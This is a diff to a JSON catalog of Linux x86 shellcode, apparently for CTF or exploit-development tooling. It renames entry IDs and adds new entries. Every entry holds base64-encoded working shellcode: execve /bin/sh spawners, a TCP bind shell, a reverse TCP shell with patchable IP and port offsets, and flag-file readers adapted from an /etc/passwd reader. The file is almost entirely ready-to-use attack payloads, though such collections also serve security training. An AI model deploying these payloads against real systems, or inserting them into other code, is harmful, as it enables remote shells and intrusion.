@@ -1,19 +1,19 @@
 [{
-	"id" : 1,
+	"name" : "linux_32_execve_1",
 	"quick" : "execve /bin/sh - 21 bytes",
 	"platform" : "Linux x86",
 	"url" : "http://shell-storm.org/shellcode/files/shellcode-575.php",
 	"author" : "Geyslan G. Bem",
 	"shellcode" : "agtYmVJoLy9zaGgvYmluieMxyc2A"
 },{
-	"id" : 2,
+	"name" : "linux_32_execve_2",
 	"quick" : "execve /bin/sh - 21 bytes",
 	"platform" : "Linux x86",
 	"url" : "http://shell-storm.org/shellcode/files/shellcode-841.php",
 	"author" : "Geyslan G. Bem",
 	"shellcode" : "Mcn34bALUWgvL3NoaC9iaW6J482A"
 },{
-	"id" : 3,
+	"name" : "linux_32_execve_3",
 	"quick" : "close(0), open('/dev/tty'), execve('/bin/sh')",
 	"description" : "Local shellcode for stdin re-open and /bin/sh exec. It closes stdin descriptor and re-opens /dev/tty, then does an execve() of /bin/sh. Useful to exploit some gets() buffer overflows in an elegant way...", 
 	"platform" : "Linux x86",
@@ -21,12 +21,58 @@
 	"author" : "Marco Ivaldi",
 	"shellcode" : "McAx27AGzYBTaC90dHloL2RldonjMclmuRInsAXNgDHAUGgvL3NoaC9iaW6J41BTieGZsAvNgA=="
 },{
-	"id" : 4,
+	"name" : "linux_32_hello_world",
 	"quick" : "write(1, 'hello world', ...)",
 	"platform" : "Linux x86",
 	"url" : "http://lucifer.phiral.net/shellcode.htm",
 	"author" : "unknown",
 	"shellcode" : "McAx2zHJMdKwBLMB6wVZsg3NXHg4MOj2////SGVsbG8gV29ybGQgIQ=="
+},{
+	"name" : "linux_32_tcp_bind_1",
+    "quick":"TCP bind shellcode (port 11111)",
+    "platform" : "Linux x86",
+    "url":"http://shell-storm.org/shellcode/files/shellcode-836.php",
+    "author":"Geyslan G. Bem",
+    "shellcode":"Mdv347BmQ1JTagKJ4c2AW15SZmgrZ2oQUVCwZonhzYCJUQSwZrMEzYCwZkPNgFmTaj9YzYBJefiwC2gvL3NoaC9iaW6J40HNgA==",
+    "params":{
+        "port":{
+            "default":11111,
+            "offset":20
+        }
+    }
+},{
+	"name" : "linux_32_reverse_tcp_1",
+    "quick":"Reverse TCP connect (IP, Port=11111)",
+    "platform" : "Linux x86",
+    "url":"http://shell-storm.org/shellcode/files/shellcode-838.php",
+    "author":"Geyslan G. Bem",
+    "shellcode":"Mdv347BmQ1JTagKJ4c2AWZOwP82ASXn5sGZorB+XL2ZoK2dmagKJ4WoQUVOJ4c2AsAtSaC8vc2hoL2JpbonjMcnNgA==",
+    "params":{
+        "ipv4":{
+            "default":"127.0.0.1",
+            "offset":27
+        },
+        "port":{
+            "default":11111,
+            "offset":33
+        }
+    }
+},{
+	"name" : "linux_32_read_flag_1",
+    "quick":"open('flag'), read, write(stdout)",
+    "platform" : "Linux x86",
+    "url":"http://shell-storm.org/shellcode/files/shellcode-842.php",
+    "author":"Geyslan G. Bem",
+    "note":"Original shellcode read /etc/password, modified by Marcus Hodges to read ./flag",
+    "shellcode":"Mcn34bAFUWhmbGFniePNgJORsAMx0ma6/w9CzYCSMcCwBLMBzYCTzYA="
+},{
+	"name" : "linux_32_read_flag_2",
+    "quick":"open('flag.txt'), read, write(stdout)",
+    "platform" : "Linux x86",
+    "url":"http://shell-storm.org/shellcode/files/shellcode-842.php",
+    "author":"Geyslan G. Bem",
+    "note":"Original shellcode read /etc/password, modified by Marcus Hodges to read ./flag.txt",
+    "shellcode":"Mcn34bAFUWgudHh0aGZsYWeJ482Ak5GwAzHSZrr/D0LNgJIxwLAEswHNgJPNgA=="
 }]
 
 
